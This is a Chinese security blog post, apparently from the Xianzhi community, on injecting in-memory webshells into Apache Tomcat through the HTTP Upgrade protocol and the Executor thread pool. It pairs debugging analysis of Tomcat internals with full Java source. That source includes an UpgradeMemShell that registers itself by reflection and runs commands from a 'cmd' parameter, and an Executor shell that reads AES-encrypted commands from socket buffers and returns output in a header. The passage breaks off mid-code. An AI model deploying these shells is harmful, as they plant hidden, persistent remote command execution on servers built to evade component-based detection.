# CC注入Tomcat Upgrade/Executor/WebSocket内存马-先知社区

> **来源**: https://xz.aliyun.com/news/17766  
> **文章ID**: 17766

---

学习一下Tomcat中和组件内存马不一样的马。除了学习注入原理外，其payload还在一些缩短payload的场景有应用，比如shiro

# CC注入Tomcat Upgrade/Executor/WebSocket内存马

漏洞所用环境及测试全部代码<https://github.com/godownio/TomcatMemshell>

漏洞路由为yourip:8080/TomcatMemshell\_war\_exploded/Vuln

## Upgrade内存马

反向代理（**Reverse Proxy**）是一种服务器，它**站在客户端和目标服务器之间**，**代表客户端向目标服务器发起请求**，然后把服务器的响应返回给客户端

你看不到背后的服务器，甚至都不知道它有多少台，或者地址是什么。

![](images/20250416144228-f6ea5ecd-1a8d-1.png)

![](images/20250416144229-f7a8381a-1a8d-1.png)

在有反向代理的情况下，植入需要新映射url的servlet、controller内存马因为没有在反向代理中配置的原因，会无法找到对应路径。又或者是在当前路径访问的Filter、Listener、valve可能因为原有Filter的原因注入失败。而且新加组件的动静非常大。通用回显严格说来不算内存马，每次都需要打一次payload，只能说是一种回显方式，并没有做持久化。blue0师傅发现在Processor中也存在一种可以利用的内存马

随便找个servlet项目在doGet or doPost打上断点

Http11Processor.service()内调用了isConnectionToken，判断header里有没有Connection:upgrade的请求头;

如果有的话取出Upgrade请求头对应的对象名，然后getUpgradeProtocol取出UpgradeProtocol。然后调用该对象的accept方法

![](images/20250416144230-f84b1a02-1a8d-1.png)

![](images/20250416144231-f8cf95b1-1a8d-1.png)

什么意思呢？就是如下请求头，会调用protocol.getUpgradeProtocol取出test这个UpgradeProtocol

```
Connection: upgrade
Upgrade: test
```

看到getUpgradeProtocol方法，从httpUpgradeProtocols中取出对象

![](images/20250416144232-f924d3b1-1a8d-1.png)

接下来寻找在哪初始化的httpUpgradeProtocols，如果在Tomcat启动时初始化，那么就可以进行修改，如果在一次请求中初始化，则理论上每次请求都不一样，就不能注入内存马

在configureUpgradeProtocol方法内向httpUpgradeProtocols内put了upgradeProtocol，且将其name作为键名

![](images/20250416144232-f9913925-1a8d-1.png)

通过查找用法configureUpgradeProtocol仅在AbstractHttp11Protocol.init内调用

![](images/20250416144233-f9fec306-1a8d-1.png)

通过在该方法打上断点，发现在Tomcat初始化时通过如下调用栈调用：

![](images/20250416144234-fa9ea4bf-1a8d-1.png)

且初始upgradeProtocols为空，给我们注入留下了比较稳定的空间

![](images/20250416144235-fb0df9c0-1a8d-1.png)

1. 恶意代码应该写在哪？

上文提到了，获取了UpgradeProtocol后，会去主动调用accept方法，且参数request是org.apache.coyote.Request。则写入一个恶意UpgradeProtocol，accept内为恶意代码

![](images/20250416144236-fb83b62d-1a8d-1.png)

1. 如何获取httpUpgradeProtocols?

通过request能获取到Http11NioProtocol，这是AbstractHttp11Protocol的子类，能获取到httpUpgradeProtocols

RequestFacade.request.connector.protocolHandler.httpUpgradeProtocols

![](images/20250416144236-fbe12901-1a8d-1.png)

![](images/20250416144237-fc40892b-1a8d-1.png)

![](images/20250416144239-fdd27d38-1a8d-1.png)

![](images/20250416144240-fe5a1e2d-1a8d-1.png)

然后是payload：

* 如果是js环境推荐直接从request中获取

```
RequestFacade rf = (RequestFacade) request;
Field requestField = RequestFacade.class.getDeclaredField("request");
requestField.setAccessible(true);
Request request1 = (Request) requestField.get(rf);

Field connector = Request.class.getDeclaredField("connector");
connector.setAccessible(true);
Connector realConnector = (Connector) connector.get(request1);

Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
protocolHandlerField.setAccessible(true);
AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(realConnector);

HashMap<String, UpgradeProtocol> upgradeProtocols = null;
Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
upgradeProtocolsField.setAccessible(true);
upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
```

并不能从StandardContext中获取到request，StandardContext 是容器结构，而 Request 是运行时结构

需要用到通用回显的方式获取到request

给一个Latch1通过全局global获取request姿势拼接的Upgrade内存马：

```
package org.example.tomcatmemshell.Upgrade;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.catalina.Context;
import org.apache.catalina.WebResourceRoot;
import org.apache.catalina.connector.Connector;
import org.apache.catalina.connector.Response;
import org.apache.catalina.loader.WebappClassLoaderBase;
import org.apache.coyote.Adapter;
import org.apache.coyote.Processor;
import org.apache.coyote.Request;
import org.apache.coyote.UpgradeProtocol;
import org.apache.coyote.http11.AbstractHttp11Protocol;
import org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler;
import org.apache.tomcat.util.net.SocketWrapperBase;

import java.lang.reflect.Field;
import java.util.HashMap;

public class UpgradeMemShell extends AbstractTranslet implements UpgradeProtocol{
    static {
        try {

            //获取WebappClassLoaderBase
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            Field webappclassLoaderBaseField=Class.forName("org.apache.catalina.loader.WebappClassLoaderBase").getDeclaredField("resources");
            webappclassLoaderBaseField.setAccessible(true);
            WebResourceRoot resources=(WebResourceRoot) webappclassLoaderBaseField.get(webappClassLoaderBase);
            Context StandardContext =  resources.getContext();

            //获取ApplicationContext
            java.lang.reflect.Field contextField = org.apache.catalina.core.StandardContext.class.getDeclaredField("context");
            contextField.setAccessible(true);
            org.apache.catalina.core.ApplicationContext applicationContext = (org.apache.catalina.core.ApplicationContext) contextField.get(StandardContext);

            //获取StandardService
            java.lang.reflect.Field serviceField = org.apache.catalina.core.ApplicationContext.class.getDeclaredField("service");
            serviceField.setAccessible(true);
            org.apache.catalina.core.StandardService standardService = (org.apache.catalina.core.StandardService) serviceField.get(applicationContext);

            //获取Connector
            org.apache.catalina.connector.Connector[] connectors = standardService.findConnectors();

            //找到指定的Connector
            for (int i = 0; i < connectors.length; i++) {
                if (connectors[i].getScheme().contains("http")) {
                    //获取protocolHandler、connectionHandler
                    org.apache.coyote.ProtocolHandler protocolHandler = connectors[i].getProtocolHandler();
                    java.lang.reflect.Method getHandlerMethod = org.apache.coyote.AbstractProtocol.class.getDeclaredMethod("getHandler", null);
                    getHandlerMethod.setAccessible(true);
                    org.apache.tomcat.util.net.AbstractEndpoint.Handler connectionHandler = (org.apache.tomcat.util.net.AbstractEndpoint.Handler) getHandlerMethod.invoke(protocolHandler, null);

                    //获取RequestGroupInfo
                    java.lang.reflect.Field globalField = Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global");
                    globalField.setAccessible(true);
                    org.apache.coyote.RequestGroupInfo requestGroupInfo = (org.apache.coyote.RequestGroupInfo) globalField.get(connectionHandler);

                    //获取RequestGroupInfo中储存了RequestInfo的processors
                    java.lang.reflect.Field processorsField = org.apache.coyote.RequestGroupInfo.class.getDeclaredField("processors");
                    processorsField.setAccessible(true);
                    java.util.List list = (java.util.List) processorsField.get(requestGroupInfo);
                    for (int k = 0; k < list.size(); k++) {
                        org.apache.coyote.RequestInfo requestInfo = (org.apache.coyote.RequestInfo) list.get(k);
                        //获取request
                        java.lang.reflect.Field requestField = org.apache.coyote.RequestInfo.class.getDeclaredField("req");
                        requestField.setAccessible(true);
                        org.apache.coyote.Request tempRequest = (org.apache.coyote.Request) requestField.get(requestInfo);
                        org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) tempRequest.getNote(1);
                        Field connectorField = org.apache.catalina.connector.Request.class.getDeclaredField("connector");
                        connectorField.setAccessible(true);
                        Connector connector = (Connector) connectorField.get(request);

                        Field protocolHandlerField = Connector.class.getDeclaredField("protocolHandler");
                        protocolHandlerField.setAccessible(true);
                        AbstractHttp11Protocol handler = (AbstractHttp11Protocol) protocolHandlerField.get(connector);

                        HashMap<String, UpgradeProtocol> upgradeProtocols = null;
                        Field upgradeProtocolsField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
                        upgradeProtocolsField.setAccessible(true);
                        upgradeProtocols = (HashMap<String, UpgradeProtocol>) upgradeProtocolsField.get(handler);
                        upgradeProtocols.put("UpgradeMemShell",new UpgradeMemShell());
                        upgradeProtocolsField.set(handler,upgradeProtocols);
                        break;
                    }
                    break;
                }
            }
        }
        catch (Exception e) {
        }
    }
    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
    @Override
    public String getHttpUpgradeName(boolean isSSLEnabled) {
        return null;
    }

    @Override
    public byte[] getAlpnIdentifier() {
        return new byte[0];
    }

    @Override
    public String getAlpnName() {
        return null;
    }

    @Override
    public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) {
        return null;
    }

    @Override
    public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
        return null;
    }

    @Override
    public boolean accept(Request request) {
        org.apache.catalina.connector.Request Realrequest = (org.apache.catalina.connector.Request) request.getNote(1);
        Response response = Realrequest.getResponse();
        System.out.println(
                "TomcatShellInject Upgrade accept.....................................................................");
        String cmdParamName = "cmd";
        String cmd;
        try {
            if ((cmd = Realrequest.getParameter(cmdParamName)) != null) {
                Process process = Runtime.getRuntime().exec(cmd);
                java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                        new java.io.InputStreamReader(process.getInputStream()));
                StringBuilder stringBuilder = new StringBuilder();
                String line;
                while ((line = bufferedReader.readLine()) != null) {
                    stringBuilder.append(line + '
');
                }
                response.getOutputStream().write(stringBuilder.toString().getBytes());
                response.getOutputStream().flush();
                response.getOutputStream().close();
            }
        }catch (Exception e){
            e.printStackTrace();
        }
        return true;
    }
}
```

注意执行命令需要带上Connection: Upgrade和Upgrade请求头

![](images/20250416144241-fedb8675-1a8d-1.png)

## Executor内存马（不稳定，复现失败）

上面的Upgrade马实际上作用于下图connector内的Http11Processor，实际上还有更靠前的位置可以注入内存马。但是靠前的位置带给了这种内存马极其不稳定回显的局限性

还是可以学习一下，因为说不定就找到了稳定的回显，这种Executor马又具有常规组件查杀工具查杀不到的性质，未来可期呢。

![](images/20250416144242-ff6ded85-1a8d-1.png)

图上Endpoint属于Http11Protocol的一部分，实际Http11Protocol在Tomcat高版本处弃用状态，实际使用的是Http11NioProtocol

![](images/20250416144243-fffcbc26-1a8d-1.png)

### Endpoint

Endpoint 是 ProtocolHandler 中用来**监听端口、接收连接、分发 socket 给 Processor 处理**的组件。

* NioEndpoint：基于 Java NIO 的非阻塞实现
* AprEndpoint：基于 APR 的 native 实现
* JIoEndpoint：老的基于传统 BIO 的实现

你可以把它当作一个“Socket Server”，它主要负责：

![](images/20250416144244-005e6d77-1a8e-1.png)

### Processor

Processor才是真正处理请求的逻辑，比如 Http11Processor：

* 解析 HTTP 请求
* 封装成 Request / Response
* 调用 servlet 容器（Engine → Host → Context → Wrapper）

HTTP请求到来，Tomcat处理的简化流程如下：

1. Connector 初始化并创建 ProtocolHandler
2. ProtocolHandler 持有一个 Endpoint（如 NioEndpoint）
3. NioEndpoint 启动并监听端口
4. 来一个连接后：

* NioEndpoint 分配线程处理连接
* 调用 Processor（如 Http11Processor）来解析和响应请求

上面的Upgrade内存马，实际上也可以被称作Processor内存马

下面我们详细解释一下上面提到的Endpoint

### Endpoint

#### Acceptor

Acceptor属于Endpoint的一部分

Tomcat 启动后，每个 Connector 会对应一个 Endpoint，Endpoint 会启动一个 Acceptor 线程

**调用** **ServerSocketChannel.accept()** **等方法接受客户端连接**

**将 Socket 通知给 Poller / Worker 线程（由线程池处理请求）**

![](images/20250416144244-00c2d8a9-1a8e-1.png)

在 **NIO 模型**下，不是每个连接对应一个线程，而是将连接注册到 Selector 上。

Poller 就是维护 Selector 的线程，不断轮询：“哪个连接有数据要读？”

Poller的主要工作如下，很好理解：

* 注册 SocketChannel 到 Selector
* 在 Selector.select() 时发现连接有数据可读
* 将“有数据可读的连接”**放到工作队列**中，交给 Worker 来处理

#### Executor

似乎Endpoint有Acceptor就足够分发请求到Processor了，那Executor在整个处理过程中有什么作用呢？

默认每个 Connector 的 Endpoint 会自己创建一个线程池来处理 Socket 连接；如果有多个 Connector（比如 HTTP + AJP），那就是多个线程池，**不容易统一配置和管理**；引入 Executor 后，就可以在多个 Connector 之间共享线程池。

如果配置了Executor，Endpoint（比如 NioEndpoint）的线程池不再自己 new，而是用这个共享的 Executor

从一个请求到达Tomcat的栈图可以验证以上理论

![](images/20250416144245-015af25a-1a8e-1.png)

其中Poller不属于Executor，worker属于Executor

![](images/20250416144246-01d5e288-1a8e-1.png)

那么调用到Executor的地方一定是在Poller中，我们来调试一下

### 调试分析

断点先打在NioEndpoint$Poller.Poller()，Poller构造函数新建了WindowsSelectorImpl作为selector

![](images/20250416144247-024350c4-1a8e-1.png)

请求到来时，断点打在NioEndpoint$Poller.run()，调用了processKey()

![](images/20250416144248-02b2c2ee-1a8e-1.png)

processKey内调用了processSocket。该方法用于处理 SelectionKey 的读写事件，优先处理读事件，若失败则关闭连接；接着处理写事件，若失败也关闭连接。若存在发送文件数据，则直接处理文件发送。

![](images/20250416144249-0348640d-1a8e-1.png)

跟进到processSocket，调用了getExecutor获取executor，然后调用了对应的execute方法

![](images/20250416144250-03e303ba-1a8e-1.png)

没有Executor配置的情况下，默认是取出ThreadPoolExecutor

![](images/20250416144251-047222d2-1a8e-1.png)

org.apache.tomcat.util.threads.ThreadPoolExecutor实现自java.util.concurrent.ThreadPoolExecutor，那自定义的executor也实现这个类下的接口Executor，然后重写execute为回显代码

![](images/20250416144251-04e3e4a9-1a8e-1.png)

![](images/20250416144252-053ea27e-1a8e-1.png)

### 注入点

在哪注入Executor？

调用到getExecutor的栈如下：

![](images/20250416144253-05a080f2-1a8e-1.png)

getExecutor方法属于AbstractEndpoint，很明显getExecutor可以通过NioEndpoint去触发，变量也是存在NioEndpoint中

![](images/20250416144253-05fba526-1a8e-1.png)

能通过NioEndpoint去调用setExecutor，可以看到设置了Executor并把内置的executor置为空，这样就不会调用到上述的默认ThreadPoolExecutor了

![](images/20250416144254-0657441c-1a8e-1.png)

现在的目标是找到NioEndpoint

用java-object-searcher可以找到

<https://godownio.github.io/2025/04/09/li-yong-java-object-searcher-gou-jian-tomcat-xian-cheng-hui-xian/>

```
List<Keyword> keys = new ArrayList<>();
keys.add(new Keyword.Builder().setField_type("NioEndpoint").build());
//定义黑名单
List<Blacklist> blacklists = new ArrayList<>();
blacklists.add(new Blacklist.Builder().setField_type("java.io.File").build());
//新建一个广度优先搜索Thread.currentThread()的搜索器
SearchRequstByBFS searcher = new SearchRequstByBFS(Thread.currentThread(),keys);
// 设置黑名单
searcher.setBlacklists(blacklists);
//打开调试模式,会生成log日志
searcher.setIs_debug(true);
//挖掘深度为20
searcher.setMax_search_depth(20);
//设置报告保存位置
searcher.setReport_save_path("D:\");
searcher.searchObject();
```

搜索的结果如下

```
#############################################################
   Java Object Searcher v0.01
   author: c0ny1<root@gv7.me>
   github: http://github.com/c0ny1/java-object-searcher
#############################################################


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [16] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Acceptor}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> eventCache = {org.apache.tomcat.util.collections.SynchronizedStack} 
        ---> stack = {class [Ljava.lang.Object;} 
         ---> [0] = {org.apache.tomcat.util.net.NioEndpoint$PollerEvent}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
         ---> processorCache = {org.apache.tomcat.util.collections.SynchronizedStack} 
          ---> stack = {class [Ljava.lang.Object;} 
           ---> [0] = {org.apache.tomcat.util.net.NioEndpoint$SocketProcessor}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [15] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> selector = {sun.nio.ch.WindowsSelectorImpl} 
       ---> channelArray = {class [Lsun.nio.ch.SelectionKeyImpl;} 
        ---> [1] = {sun.nio.ch.SelectionKeyImpl} 
         ---> attachment = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper}


TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint} 
       ---> nioChannels = {org.apache.tomcat.util.collections.SynchronizedStack} 
        ---> stack = {class [Ljava.lang.Object;} 
         ---> [0] = {org.apache.tomcat.util.net.NioChannel} 
          ---> socketWrapper = {org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper}
```

链子肯定是选下面这条

```
TargetObject = {org.apache.tomcat.util.threads.TaskThread} 
  ---> group = {java.lang.ThreadGroup} 
   ---> threads = {class [Ljava.lang.Thread;} 
    ---> [14] = {java.lang.Thread} 
     ---> target = {org.apache.tomcat.util.net.NioEndpoint$Poller} 
      ---> this$0 = {org.apache.tomcat.util.net.NioEndpoint}
```

注意，并不是每次都在[14]的位置存在NioEndpoint$Poller，可以确定的是Thread名包含ClientPoller的肯定会存在NioEndpoint$Poller。为了避免歧义，一定要固定好ClientPoller-0或者ClientPoller-1

![](images/20250416144254-06c7ae15-1a8e-1.png)

目前的整体框架：

```
package org.example.tomcatmemshell.Executor;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.coyote.Request;
import org.apache.coyote.RequestGroupInfo;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.AbstractEndpoint;
import org.apache.tomcat.util.net.NioEndpoint;

import java.lang.reflect.Field;
import java.util.concurrent.Executor;

public class ExecutorMemShell extends AbstractTranslet implements Executor {
    static {
        try{
            String pass = "cmd";
            Thread TaskThread = Thread.currentThread();
            ThreadGroup threadGroup = TaskThread.getThreadGroup();
            Thread[] threads = (Thread[]) getClassField(ThreadGroup.class,threadGroup,"threads");
            for(Thread thread:threads) {
                if (thread.getName().contains("http-nio") && thread.getName().contains("ClientPoller-1")) {
                    Object target = getClassField(Thread.class, thread, "target");
                    NioEndpoint this0 = (NioEndpoint) getClassField(Class.forName("org.apache.tomcat.util.net.NioEndpoint$Acceptor"), target, "this$0");
                    this0.setExecutor(new ExecutorMemShell());
                    break;
                }
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    public static Object getClassField(Class clazz,Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = clazz.getDeclaredField(fieldName);
        field.setAccessible(true);
        Object var =  field.get(object);
        return var;
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

    @Override
    public void execute(Runnable command) {
        System.out.println("testing");
    }
}
```

### 回显

重写的execute参数只有command，没有以往组件内存马自带的request作为参数，如何回显？

![](images/20250416144255-074c2e91-1a8e-1.png)

executor可以打通用回显吗？

答案是不能，因为请求到达Executor时，如上文所说，还没有进行Processor处理，取到了request，但是request里没东西

下图是我打入内存马后用?cmd=ipconfig测试，结果request为R(null)的例子

![](images/20250416144257-081ab89b-1a8e-1.png)

executor内存马中，就不能想着去取request进行回显了

这个内存马的发现者肯定找到了办法进行回显的

网上很火的一种方式是找Channel，消息没有读取出来，肯定是在channel里

按照如下变量栈，可以找到请求：

command.socketWrapper.socket.appReadBufHandler.byteBuffer.hb

不过获取的请求是byte形式，转为String后也无法直接作为request，不过可以利用固定的分割作为匹配

![](images/20250416144259-0938469d-1a8e-1.png)

![](images/20250416144300-09e26963-1a8e-1.png)

比如使用自定义的Header，并将显著标志作为字符串结尾，如cmd:whoami

#### 问题1

但是我们来分析一下：

最开始执行到ThreadPoolExecutor.executor内appReadBufHandler是空的，注意！此时已经到Executor内了，意味着我们自定义的Executor也会和这个一样appReadBufHandler为空。

![](images/20250416144301-0acb7a95-1a8e-1.png)

Executor发给Worker处理后，初始化Http11InputBuffer才会调用到setAppReadBufHandler进行处理！所以以上读取requestString的方式是错的

![](images/20250416144303-0bc35f77-1a8e-1.png)

![](images/20250416144304-0c8513aa-1a8e-1.png)

如果有appReadBufHandler，那是上一次请求的缓存。比如先打一个注册Executor内存马，那想执行到execute时，appReadBufHandler中不是带命令的request，而是上一次注册Executor的请求，如果你在注册Executor请求中就带上cmd:xxx
，那就能执行命令，这也是众多文章说此方法不稳定的原因

#### 问题2

如果制作的类如下，修改了executor会导致后面的诸多正常请求无法完成分发，导致Tomcat出现错误

![](images/20250416144305-0d22c663-1a8e-1.png)

正常的业务极有可能被直接打崩

当然，如果继承ThreadPoolExecutor正常业务就能顺利运行，但是就无法继承AbstractTranslet了，应用面会比较窄，所以作者给出的都是JSP的代码

### 回显构造（不稳定）

我的思路是自定义defineClass去加载恶意Executor，但是触发方式依旧是极不稳定

作者给出的第二版代码<https://xz.aliyun.com/news/11059>

甚至触发稳定性不如第一版，-.-

给一个第二版代码，definClass后是能成功触发到executor的getRequest的，只是取request大概率为空导致复现失败。加载字节码的思路是没错的

注意！defineClass加载字节码所用的ClassLoader必须是Tomcat的WebappClassLoader，只有这个类加载器加载的字节码才能使用Tomcat的类，比如org.apache.tomcat.util.threads.ThreadPoolExecutor，否则会报java.lang.NoClassDefFoundError: org/apache/tomcat/util/threads/ThreadPoolExecutor

恶意Executor：生成Base64放到代码2

```
package org.example.tomcatmemshell.Executor;

import org.apache.catalina.connector.Response;
import org.apache.coyote.RequestInfo;
import org.apache.tomcat.util.net.NioEndpoint;
import org.apache.tomcat.util.threads.ThreadPoolExecutor;

import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.ByteBuffer;
import java.nio.channels.SelectionKey;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.ArrayList;
import java.util.Base64;
import java.util.LinkedList;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.RejectedExecutionHandler;
import java.util.concurrent.ThreadFactory;
import java.util.concurrent.TimeUnit;

public class ThreadExecutor extends ThreadPoolExecutor {
    public static void main(String[] args) throws IOException {
        byte[] string = Base64.getEncoder().encode(Files.readAllBytes(Paths.get("target/classes/org/example/tomcatmemshell/Executor/ThreadExecutor.class")));
        System.out.println(new String(string));
    }
    public static final String DEFAULT_SECRET_KEY = "blueblueblueblue";
    private static final String AES = "AES";
    private static final byte[] KEY_VI = "blueblueblueblue".getBytes();
    private static final String CIPHER_ALGORITHM = "AES/CBC/PKCS5Padding";
    private static java.util.Base64.Encoder base64Encoder = java.util.Base64.getEncoder();
    private static java.util.Base64.Decoder base64Decoder = java.util.Base64.getDecoder();

    public ThreadExecutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue<Runnable> workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) {
        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);
    }

    public String getRequest2() throws NoSuchFieldException, IllegalAccessException {
        Thread TaskThread = Thread.currentThread();
        ThreadGroup threadGroup = TaskThread.getThreadGroup();
        Thread[] threads1 = (Thread[]) getClassField(ThreadGroup.class, threadGroup, "threads");

        for (Thread thread : threads1) {
            String threadName = thread.getName();
            if (threadName.contains("Client")) {
                Object target = getField(thread, "target");
                if (target instanceof Runnable) {
                    try {
                        byte[] bytes = new byte[8192];
                        ByteBuffer buf = ByteBuffer.wrap(bytes);
                        try {
                            LinkedList linkedList = (LinkedList) getField(getField(getField(target, "selector"), "kqueueWrapper"), "updateList");
                            for (Object obj : linkedList) {
                                try {
                                    SelectionKey[] selectionKeys = (SelectionKey[]) getField(getField(obj, "channel"), "keys");

                                    for (Object tmp : selectionKeys) {
                                        try {
                                            NioEndpoint.NioSocketWrapper nioSocketWrapper = (NioEndpoint.NioSocketWrapper) getField(tmp, "attachment");
                                            try {
                                                nioSocketWrapper.read(false, buf);
                                                String a = new String(buf.array(), "UTF-8");
                                                if (a.indexOf("blue0") > -1) {
                                                    System.out.println(a.indexOf("blue0"));
                                                    System.out.println(a.indexOf("\r", a.indexOf("blue0")));
                                                    String b = a.substring(a.indexOf("blue0") + "blue0".length() + 2, a.indexOf("\r", a.indexOf("blue0")));
                                                    b = decode(DEFAULT_SECRET_KEY, b);
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    System.out.println(b);
                                                    System.out.println(new String(buf.array(), "UTF-8"));
                                                    return b;
                                                } else {
                                                    buf.position(0);
                                                    nioSocketWrapper.unRead(buf);
                                                    continue;
                                                }
                                            } catch (Exception e) {
                                                nioSocketWrapper.unRead(buf);
                                            }
                                        } catch (Exception e) {
                                            continue;
                                        }
                                    }
                                } catch (Exception e) {
                                    continue;
                                }
                            }
                        } catch (Exception var11) {
                            System.out.println(var11);
                            continue;
                        }

                    } catch (Exception ignored) {
                    }
                }

            }
        }


        return new String();
    }


    public void getResponse(byte[] res) {
        try {
            Thread[] threads = (Thread[]) ((Thread[]) getField(Thread.currentThread().getThreadGroup(), "threads"));

            for (Thread thread : threads) {
                if (thread != null) {
                    String threadName = thread.getName();
                    if (!threadName.contains("exec") && threadName.contains("Acceptor")) {
                        Object target = getField(thread, "target");
                        if (target instanceof Runnable) {
                            try {
                                ArrayList objects = (ArrayList) getField(getField(getField(getField(target, "this$0"), "handler"), "global"), "processors");
                                for (Object tmp_object : objects) {
                                    RequestInfo request = (RequestInfo) tmp_object;
                                    Response response = (Response) getField(getField(request, "req"), "response");
                                    response.addHeader("Server-token", encode(DEFAULT_SECRET_KEY, new String(res, "UTF-8")));

                                }
                            } catch (Exception var11) {
                                continue;
                            }

                        }
                    }
                }
            }
        } catch (Exception ignored) {
        }
    }


    @Override
    public void execute(Runnable command) {
//            System.out.println("123");

        String cmd = null;
        try {
            cmd = getRequest2();
        } catch (NoSuchFieldException e) {
            throw new RuntimeException(e);
        } catch (IllegalAccessException e) {
            throw new RuntimeException(e);
        }
        if (cmd.length() > 1) {
            try {
                Runtime rt = Runtime.getRuntime();
                Process process = rt.exec(cmd);
                java.io.InputStream in = process.getInputStream();

                java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);
                java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);
                String s = "";
                String tmp = "";
                while ((tmp = stdInput.readLine()) != null) {
                    s += tmp;
                }
                if (s != "") {
                    byte[] res = s.getBytes(StandardCharsets.UTF_8);
                    getResponse(res);
                }


            } catch (IOException e) {
                e.printStackTrace();
            }
        }


        this.execute(command, 0L, TimeUnit.MILLISECONDS);
    }
    public Object getField(Object object, String fieldName) {
        Field declaredField;
        Class clazz = object.getClass();
        while (clazz != Object.class) {
            try {

                declaredField = clazz.getDeclaredField(fieldName);
                declaredField.setAccessible(true);
                return declaredField.get(object);
            } catch (NoSuchFieldException | IllegalAccessException e) {
            }
            clazz = clazz.getSuperclass();
        }
        return null;
    }

    public static String decode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance(CIPHER_ALGORITHM);
            cipher.init(javax.crypto.Cipher.DECRYPT_MODE, secretKey, new javax.crypto.spec.IvParameterSpec(KEY_VI));

            byte[] byteContent = base64Decoder.decode(content);
            byte[] byteDecode = cipher.doFinal(byteContent);
            return new String(byteDecode, java.nio.charset.StandardCharsets.UTF_8);
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    public static String encode(String key, String content) {
        try {
            javax.crypto.SecretKey secretKey = new javax.crypto.spec.SecretKeySpec(key.getBytes(), AES);
